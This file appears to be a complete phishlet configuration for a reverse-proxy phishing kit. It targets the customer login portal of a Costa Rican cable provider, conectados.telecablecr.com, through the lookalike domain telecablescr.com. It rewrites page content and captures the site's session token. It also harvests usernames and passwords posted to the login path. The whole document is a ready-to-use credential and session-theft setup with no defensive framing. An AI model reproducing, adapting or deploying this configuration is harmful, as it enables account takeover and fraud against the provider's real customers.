author: 'saenzrocker'
min_ver: '7.7.7'
proxy_hosts:
  - {phish_sub: 'telecable', orig_sub: 'conectados.telecablecr.com', domain: 'telecablescr.com', session: true, is_landing: true}
sub_filters:
  - {triggers_on: 'conectados.telecablecr.com', orig_sub: 'conectados', domain: 'telecablescr.com', search: 'https://4.246.227.130', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
auth_tokens:
  - domain: '.telecablescr.com'
    keys: ['__RequestVerificationToken']
credentials:
  username:
    key: 'UserName'
    search: '(.*)'
    type: 'post'
  password:
    key: 'Password'
    search: '(.*)'
    type: 'post'
login:
  domain: 'conectados.telecablecr.com'
  path: '/LogIn/LogOn'
